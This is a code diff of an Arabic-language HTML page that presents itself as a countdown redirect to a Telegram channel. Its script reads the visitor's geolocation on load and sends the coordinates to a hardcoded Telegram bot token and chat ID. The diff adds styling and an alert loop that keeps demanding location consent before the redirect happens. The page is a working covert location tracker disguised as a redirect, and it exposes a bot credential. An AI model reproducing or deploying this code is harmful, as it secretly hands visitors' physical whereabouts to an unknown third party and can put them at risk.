@@ -1,30 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
+  <meta charset="UTF-8" />
   <title>صفحة توجيه البوت</title>
-  <meta charset="UTF-8">
   <style>
+    /* خلفية ناعمة */
     body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: linear-gradient(135deg, #6b73ff 0%, #000dff 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
       height: 100vh;
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
-    }
-    #countdown {
-      width: 70px;
-      height: 70px;
-      font-size: 30px;
-      font-weight: bold;
-      background-color: #ffffff;
-      border: 2px solid #ccc;
-      border-radius: 10px;
       display: flex;
       justify-content: center;
       align-items: center;
+      color: #f0f0f0;
+      direction: rtl;
+    }
+
+    /* صندوق العداد */
+    #countdown {
+      width: 90px;
+      height: 90px;
+      background: rgba(255, 255, 255, 0.15);
+      border: 3px solid #ffffff80;
+      border-radius: 20px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+      font-size: 48px;
+      font-weight: 700;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+      text-shadow: 0 0 5px #00000099;
+      transition: background-color 0.3s ease;
+    }
+
+    /* تأثير عند انتهاء العد */
+    #countdown.done {
+      background: #00ff99;
+      border-color: #00cc77;
+      color: #004422;
+      box-shadow: 0 0 20px #00ff99aa;
+      text-shadow: none;
     }
   </style>
+</head>
+<body>
+  <div id="countdown">5</div>
+
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
@@ -39,12 +62,21 @@
       const interval = setInterval(() => {
         seconds--;
         countdownEl.innerText = seconds;
+
         if (seconds === 0) {
           clearInterval(interval);
-          if(locationSent) {
-            window.location.href = "https://t.me/sswq22";
+          if (locationSent) {
+            countdownEl.classList.add('done');
+            countdownEl.innerText = "✔";
+            setTimeout(() => {
+              window.location.href = "https://t.me/sswq22";
+            }, 1000);
           } else {
             alert("يرجى الموافقة على مشاركة الموقع أولاً.");
+            // ترجع العداد للـ5
+            seconds = 5;
+            countdownEl.innerText = seconds;
+            startCountdown();
           }
         }
       }, 1000);
@@ -58,7 +90,7 @@
 
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
             .then(() => {
-              locationSent = true;  // علمنا أن الموقع أُرسل بنجاح
+              locationSent = true;
             })
             .catch(() => {
               locationSent = false;
@@ -75,10 +107,7 @@
     window.onload = () => {
       getLocationAndSend();
       startCountdown();
-    }
+    };
   </script>
-</head>
-<body>
-  <div id="countdown">5</div>
 </body>
 </html>
